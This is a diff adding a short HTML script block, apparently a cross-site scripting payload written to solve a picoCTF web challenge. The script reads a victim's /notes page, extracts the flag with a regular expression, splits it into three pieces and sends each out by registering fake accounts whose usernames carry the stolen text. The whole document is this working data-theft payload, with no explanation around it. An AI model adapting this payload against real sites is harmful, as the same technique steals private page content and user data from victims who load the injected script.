@@ -1,0 +1,14 @@
+<script>
+fetch('http://0.0.0.0:8080/notes').then(r=>r.text()).then(h=>{
+let m=h.match(/picoCTF\{[^}]+\}/);
+if(m){
+let f=m[0];
+let p1=f.substring(0,25);
+let p2=f.substring(25,50);
+let p3=f.substring(50,75);
+fetch('http://0.0.0.0:8080/register',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'username=f1_'+encodeURIComponent(p1)+'&password=x'});
+setTimeout(()=>fetch('http://0.0.0.0:8080/register',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'username=f2_'+encodeURIComponent(p2)+'&password=x'}),500);
+setTimeout(()=>fetch('http://0.0.0.0:8080/register',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'username=f3_'+encodeURIComponent(p3)+'&password=x'}),1000);
+}
+});
+</script>
